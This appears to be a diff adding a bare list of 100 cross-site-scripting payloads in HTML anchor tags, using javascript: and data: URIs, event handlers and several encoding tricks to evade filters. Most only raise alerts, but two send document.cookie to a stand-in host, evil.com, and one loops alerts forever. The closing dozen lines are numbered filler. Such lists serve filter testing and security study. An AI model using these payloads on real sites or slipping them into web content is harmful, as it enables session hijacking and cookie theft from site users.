@@ -1,0 +1,100 @@
+<a href="javascript:alert(1)">XSS</a>
+<a href="javascript:confirm(1)">XSS</a>
+<a href="javascript:prompt(1)">XSS</a>
+<a href="JaVaScRiPt:alert('XSS')">XSS</a>
+<a href="javascript:alert(document.cookie)">XSS</a>
+<a href="javascript:alert(document.domain)">XSS</a>
+<a href="javascript:alert(navigator.userAgent)">XSS</a>
+<a href="javascript:void(alert(1))">XSS</a>
+<a href="data:text/html,<script>alert('XSS')</script>">XSS</a>
+<a href="javascript:`alert(1)`">XSS</a>
+<a href="javascript:eval('alert(1)')">XSS</a>
+<a href="javascript:alert(/XSS/.source)">XSS</a>
+<a href="javascript:this.onerror=alert;throw 1">XSS</a>
+<a href="javascript:window.onerror=alert;throw 1">XSS</a>
+<a href="javascript:setTimeout('alert(1)', 1000)">XSS</a>
+<a href="javascript:Function('alert(1)')()">XSS</a>
+<a href="javascript:top.alert('XSS')">XSS</a>
+<a href="javascript:parent.alert('XSS')">XSS</a>
+<a href="javascript:window.open('javascript:alert(1)')">XSS</a>
+<a href="javascript:new Function`alert\x281\x29`">XSS</a>
+<a href="javascript:alert`XSS`">XSS</a>
+<a href="javascript:document.write('<script>alert(1)</script>')">XSS</a>
+<a href="javascript:void(0)" onclick="alert(1)">XSS</a>
+<a href="//example.com" onclick="alert(1)">XSS</a>
+<a href="javascript:document.location='javascript:alert(1)'">XSS</a>
+<a href="javascript:location.href='javascript:alert(1)'">XSS</a>
+<a href="javascript:location='javascript:alert(1)'">XSS</a>
+<a href="javascript:window ">XSS</a>
+<a href="javascript:this ">XSS</a>
+<a href="javascript:Object.constructor('alert(1)')()">XSS</a>
+<a href="javascript:((alert))('XSS')">XSS</a>
+<a href="javascript:alert(0x58)">XSS</a>
+<a href="javascript:\u0061lert(1)">XSS</a>
+<a href="javascript:%61lert(1)">XSS</a>
+<a href="javascript:alert(String.fromCharCode(88,83,83))">XSS</a>
+<a href="javascript:alert(String.raw`XSS`)">XSS</a>
+<a href="javascript:document.body.innerHTML='XSS'+alert(1)">XSS</a>
+<a href="javascript:void(0)" onmouseover="alert('XSS')">XSS</a>
+<a href="javascript:void(0)" onfocus="alert('XSS')">XSS</a>
+<a href="javascript:void(0)" onmousedown="alert('XSS')">XSS</a>
+<a href="javascript:void(0)" onmouseenter="alert('XSS')">XSS</a>
+<a href="javascript:void(0)" onmouseleave="alert('XSS')">XSS</a>
+<a href="javascript:alert('\u0041\u0042\u0043')">XSS</a>
+<a href="javascript:alert('Line\nBreak')">XSS</a>
+<a href="javascript:alert('🎯')">XSS</a>
+<a href="javascript:alert('&#x58;&#x53;&#x53;')">XSS</a>
+<a href="javascript:%0Aalert(1)">XSS</a>
+<a href="javascript:%0Dalert(1)">XSS</a>
+<a href="javascript:%09alert(1)">XSS</a>
+<a href="javascript:alert(window.location)">XSS</a>
+<a href="javascript:this.location='javascript:alert(1)'">XSS</a>
+<a href="javascript:window.location.replace('javascript:alert(1)')">XSS</a>
+<a href="javascript:document.location.replace('javascript:alert(1)')">XSS</a>
+<a href="javascript:alert(document.referrer)">XSS</a>
+<a href="javascript:alert(navigator.platform)">XSS</a>
+<a href="javascript:alert(window.name)">XSS</a>
+<a href="javascript:alert(window.top)">XSS</a>
+<a href="javascript:while(1)alert(1)">XSS</a>
+<a href="javascript:document.body.append('<img src=x onerror=alert(1)>')">XSS</a>
+<a href="javascript:void(document.write('<img src=x onerror=alert(1)>'))">XSS</a>
+<a href="javascript:this.innerHTML='XSS';alert(1)">XSS</a>
+<a href="javascript:with(document)alert(cookie)">XSS</a>
+<a href="javascript:alert(document.URL)">XSS</a>
+<a href="javascript:new Image().src='x',alert(1)">XSS</a>
+<a href="javascript:alert(atob('WFNT'))">XSS</a>
+<a href="javascript:alert(btoa('XSS'))">XSS</a>
+<a href="javascript:/XSS/.test(alert(1))">XSS</a>
+<a href="javascript:alert(new Date)">XSS</a>
+<a href="javascript:alert(document.forms.length)">XSS</a>
+<a href="javascript:fetch('http://evil.com?cookie='+document.cookie)">XSS</a>
+<a href="javascript:alert(typeof alert)">XSS</a>
+<a href="javascript:alert(typeof document)">XSS</a>
+<a href="javascript:alert(typeof window)">XSS</a>
+<a href="javascript:alert(document.images.length)">XSS</a>
+<a href="javascript:document.body.setAttribute('style','background:red');alert(1)">XSS</a>
+<a href="javascript:[1].map(alert)">XSS</a>
+<a href="javascript:[].filter.call('XSS', alert)">XSS</a>
+<a href="javascript:alert('injection')">XSS</a>
+<a href="javascript:alert(1)//">XSS</a>
+<a href="javascript:alert(1);void(0)">XSS</a>
+<a href="javascript:/*XSS*/alert(1)">XSS</a>
+<a href="javascript://%0Aalert(1)">XSS</a>
+<a href="javascript:alert(1);location.href='https://safe.com'">XSS</a>
+<a href="javascript:alert`document.domain`">XSS</a>
+<a href="javascript:{alert(1)}">XSS</a>
+<a href="javascript:location='//evil.com'+document.cookie">XSS</a>
+<a href="javascript:alert(1)//comment">XSS</a>
+<a href="javascript:alert(Math.random())">XSS</a>
+<a href="javascript:alert('payload #89')">XSS</a>
+<a href="javascript:alert('payload #90')">XSS</a>
+<a href="javascript:alert('payload #91')">XSS</a>
+<a href="javascript:alert('payload #92')">XSS</a>
+<a href="javascript:alert('payload #93')">XSS</a>
+<a href="javascript:alert('payload #94')">XSS</a>
+<a href="javascript:alert('payload #95')">XSS</a>
+<a href="javascript:alert('payload #96')">XSS</a>
+<a href="javascript:alert('payload #97')">XSS</a>
+<a href="javascript:alert('payload #98')">XSS</a>
+<a href="javascript:alert('payload #99')">XSS</a>
+<a href="javascript:alert('payload #100')">XSS</a>
